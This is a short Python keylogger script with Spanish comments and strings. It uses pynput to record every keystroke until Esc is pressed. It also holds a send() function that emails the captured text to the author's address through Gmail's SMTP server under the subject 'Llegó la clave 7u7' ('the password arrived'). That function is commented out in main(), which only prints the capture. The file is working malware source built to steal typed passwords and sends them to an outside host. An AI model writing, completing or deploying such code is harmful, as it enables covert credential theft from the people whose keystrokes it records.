from pynput import keyboard
import smtplib
import os
from email.message import EmailMessage
from enum import Enum

email = os.environ.get("EMAIL_USER")
passw = os.environ.get("EMAIL_PASS")
palabra = []
text = ""
item = ""

# Collect events until released
def read():
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release,
    ) as listener:
        listener.join()


def on_press(key):
    # palabra.append(key.char)
    global text
    #   text += str(key.char)

    if isinstance(key, Enum):
        if str(key) == "Key.enter":
            text += "\n"
        elif str(key) == "Key.space":
            text += " "
        else:
            print(str(key))
            text += " >>"+str(key)+"<< "
    else:
        print(key)
        text += key.char




def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

def send(text):
    msg = EmailMessage()
    msg['Subject'] = 'Llegó la clave 7u7'
    msg['From'] = email
    msg['To'] = email
    msg.set_content(f'Se detectó lo siguiente:\n{text}')

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(email, passw)
        smtp.send_message(msg)

def test(text):
    print("Al final sale:\n{0}".format(text))

def to_array(text):
    print(text.split())

def main():
    read()
    test(text)
#   send(text)
    to_array(text)


if __name__ == "__main__":
    main()


